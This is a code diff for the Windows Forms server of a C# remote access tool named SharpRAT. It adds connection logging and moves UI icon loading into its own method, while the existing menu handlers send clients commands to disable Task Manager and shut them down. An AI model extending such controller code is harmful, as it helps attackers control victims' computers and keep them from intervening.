@@ -37,6 +37,9 @@ namespace Server
             userViewItem.SubItems.Add(szIPAddress);
             userViewItem.SubItems.Add(szPort);
             userView.Items.Add(userViewItem);
+
+            // Log the new connection.
+            Log.Info($"Client {szName} - [{szIPAddress}:{szPort}] connected.");
         }
 
         private void RemoveUserFromViewlist(string text)
@@ -44,12 +47,14 @@ namespace Server
             int index = int.Parse(text);
             try
             {
+                Log.Info($"Client {userView.Items[index].Text} - [{userView.Items[index].SubItems[1].Text}:" +
+                    $"{userView.Items[index].SubItems[2].Text}] disconnected.");
                 userView.Items[index].Remove();
                 userView.Update();
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                Log.Error(ex.Message);
             }
         }
 
@@ -58,21 +63,26 @@ namespace Server
             statusLbl.Text = "Status: " + statusText;
         }
 
-        private void Main_Load(object sender, EventArgs e)
+        private void LoadImagesForUI()
         {
             /* 
              Load icons from Windows internal dlls with quite bad quality,
              it would be smarter to extract the icon files to TEMP and load them from there for better quality.
             */
-            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT"))
-            {
-                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT\\");
-            }
             settingsToolStripMenuItem.Image = WinIcons.GetImageFromIcon("wmploc.dll", (int)WinIcons.Wmploc.Settings_ICO);
             sendMessageBoxToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.PcKeyboard_ICO);
             userControlToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Keychain_ICO);
             disableTaskmanagerToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.NotAllowed_ICO);
             shutdownClientToolStripMenuItem.Image = WinIcons.GetImageFromIcon("shell32.dll", (int)WinIcons.ShellID.Shutdown_ICO);
+        }
+
+        private void Main_Load(object sender, EventArgs e)
+        {
+            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT"))
+            {
+                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT\\");
+            }
+            LoadImagesForUI();
 
             // Start the server on it's own thread, so it does not hog all the UI resources.
             Thread serverThread = new Thread(socketServer.ExecuteServer);
@@ -120,12 +130,12 @@ namespace Server
         {
             string messageBoxStr
                 = "<SET-TASKMGR>" + Convert.ToInt32(disableTaskmanagerToolStripMenuItem.Checked).ToString() + "<EOF>";
-            socketServer.Send(socketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
+            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, messageBoxStr);
         }
 
         private void shutdownClientToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            socketServer.Send(socketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>" + "<EOF>");
+            socketServer.Send(SocketServer.GetClient(userView.SelectedItems[0].Index).socket, "<SHUTDOWN-CLIENT>" + "<EOF>");
         }
 
         private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
